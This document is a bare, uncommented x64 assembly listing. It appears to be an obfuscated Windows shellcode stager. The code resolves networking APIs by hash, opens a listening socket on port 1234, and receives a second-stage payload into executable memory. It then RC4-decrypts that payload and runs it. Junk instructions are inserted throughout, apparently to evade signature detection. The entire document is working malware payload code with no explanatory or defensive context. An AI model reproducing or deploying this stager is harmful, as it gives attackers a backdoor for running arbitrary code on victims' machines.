```asm
_start:
cld
and rsp, 0xfffffffffffffff0
call L_d6
RET_a:
push r9
push r8
push rdx
push rcx
push rsi
mov rdx, 0
test rdx, rdx
mov rdx, qword ptr gs:[rdx + 0x60]
mov rdx, qword ptr [rdx + 0x18]
mov rdx, qword ptr [rdx + 0x20]
L_21:
movzx rcx, word ptr [rdx + 0x4a]
mov r9, 0
test r9, r9
mov rsi, qword ptr [rdx + 0x50]
L_2d:
mov rax, 0
test rax, rax
lodsb al, byte ptr [rsi]
cmp al, 0x61
jl L_37
sub al, 0x20
L_37:
ror r9d, 0xd
add r9d, eax
loop L_2d
push rdx
push r9
mov rdx, qword ptr [rdx + 0x20]
mov eax, dword ptr [rdx + 0x3c]
add rax, rdx
cmp word ptr [rax + 0x18], 0x20b
jne L_cb
mov eax, dword ptr [rax + 0x88]
test rax, rax
je L_cb
add rax, rdx
push rax
mov r8d, dword ptr [rax + 0x20]
add r8, rdx
mov ecx, dword ptr [rax + 0x18]
L_72:
jrcxz L_ca
dec rcx
mov esi, dword ptr [r8 + rcx*4]
xor r9, r9
add rsi, rdx
L_81:
xor rax, rax
lodsb al, byte ptr [rsi]
ror r9d, 0xd
add r9d, eax
cmp al, ah
jne L_81
add r9, qword ptr [rsp + 8]
cmp r9d, r10d
jne L_72
pop rax
mov r8d, dword ptr [rax + 0x24]
add r8, rdx
mov cx, word ptr [r8 + rcx*2]
mov r8d, dword ptr [rax + 0x1c]
add r8, rdx
mov eax, dword ptr [r8 + rcx*4]
pop r8
pop r8
pop rsi
pop rcx
add rax, rdx
pop rdx
pop r8
pop r9
pop r10
sub rsp, 0x20
push r10
jmp rax
L_ca:
pop rax
L_cb:
pop r9
pop rdx
mov rdx, qword ptr [rdx]
jmp L_21
L_d6:
pop rbp
movabs r14, 0x32335f327377
push r14
mov r14, rsp
sub rsp, 0x1a0
mov r13, rsp
mov rax, 0
test rax, rax
push rax
push rax
movabs r12, 0xd2040002
push r12
mov r12, rsp
mov rcx, r14
mov r10d, 0x726774c
call rbp
mov rdx, r13
push 0x101
pop rcx
mov r10d, 0x6b8029
call rbp
push 2
pop rcx
push rax
push rax
mov r9, 0
test r9, r9
mov r8, 0
test r8, r8
inc rax
mov rdx, rax
mov r10d, 0xe0df0fea
call rbp
mov rdi, rax
push 0x10
pop r8
mov rdx, r12
mov rcx, rdi
mov r10d, 0x6737dbc2
call rbp
mov rdx, 0
test rdx, rdx
mov rcx, rdi
mov r10d, 0xff38e9b7
call rbp
mov r8, 0
test r8, r8
mov rdx, 0
test rdx, rdx
mov rcx, rdi
mov r10d, 0xe13bec74
call rbp
mov rcx, rdi
mov rdi, rax
mov r10d, 0x614d6e75
call rbp
add rsp, 0x2b0
sub rsp, 0x10
mov rdx, rsp
mov r9, 0
test r9, r9
push 4
pop r8
mov rcx, rdi
mov r10d, 0x5fc8d902
call rbp
add rsp, 0x20
pop rsi
lea esi, [rsi + 0]
xor esi, 0xd3a205a0
lea r11, [rsi + 0x100]
push 0x40
pop r9
push 0x1000
pop r8
mov rdx, rsi
mov rcx, 0
test rcx, rcx
mov r10d, 0xe553a458
call rbp
lea rbx, [rax + 0x100]
mov r15, rbx
push rbx
push rsi
push rax
L_1d5:
mov r9, 0
test r9, r9
mov r8, rsi
mov rdx, rbx
mov rcx, rdi
mov r10d, 0x5fc8d902
call rbp
add rsp, 0x20
add rbx, rax
sub rsi, rax
jne L_1d5
mov r14, rdi
pop rdi
pop rcx
pop r9
push r14
call L_213
xor al, 0x2a
push 0x53d0a27e
.byte 0x60, 0xc9, 0x53, 0x10, 0x7a, 0xcb, 0xe8, 0x3e, 0x08
L_213:
.byte 0x5e, 0x48, 0x31, 0xc0, 0x49, 0x89, 0xf8, 0xaa, 0xfe, 0xc0, 0x75, 0xfb, 0x48, 0x31, 0xdb, 0x41, 0x02, 0x1c, 0x00, 0x48, 0x89, 0xc2, 0x80, 0xe2, 0x0f, 0x02, 0x1c, 0x16, 0x41, 0x8a, 0x14, 0x00, 0x41, 0x86, 0x14, 0x18, 0x41, 0x88, 0x14, 0x00, 0xfe, 0xc0, 0x75, 0xe3, 0x48, 0x31, 0xdb, 0xfe, 0xc0, 0x41, 0x02, 0x1c, 0x00, 0x41, 0x8a, 0x14, 0x00, 0x41, 0x86, 0x14, 0x18, 0x41, 0x88, 0x14, 0x00, 0x41, 0x02, 0x14, 0x18, 0x41, 0x8a, 0x14, 0x10, 0x41, 0x30, 0x11, 0x49, 0xff, 0xc1, 0x48, 0xff, 0xc9, 0x75, 0xdb, 0x5f, 0x41, 0xff, 0xe7, 0x58, 0x6a, 0x00, 0x59, 0x49, 0xc7, 0xc2, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5
```